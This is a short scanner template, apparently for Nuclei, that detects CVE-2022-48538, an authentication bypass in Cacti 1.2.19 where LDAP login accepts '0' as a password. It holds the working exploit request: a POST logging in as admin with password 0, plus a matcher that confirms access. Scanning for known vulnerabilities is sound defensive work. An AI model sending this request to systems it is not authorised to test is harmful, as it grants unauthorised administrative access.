id: CVE-2022-48538

info:
  name: Cacti Authentication Bypass via LDAP
  author: ProjectDiscoveryAI
  severity: medium
  description: In Cacti 1.2.19, there is an authentication bypass in the web login functionality because of improper validation in the PHP code: cacti_ldap_auth() allows a zero as the password.
  reference:
    - https://github.com/Cacti/cacti/issues/5189

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      action=login&login_username=admin&login_password=0

    matchers:
      - type: word
        words:
          - "local_graph_id"
        part: body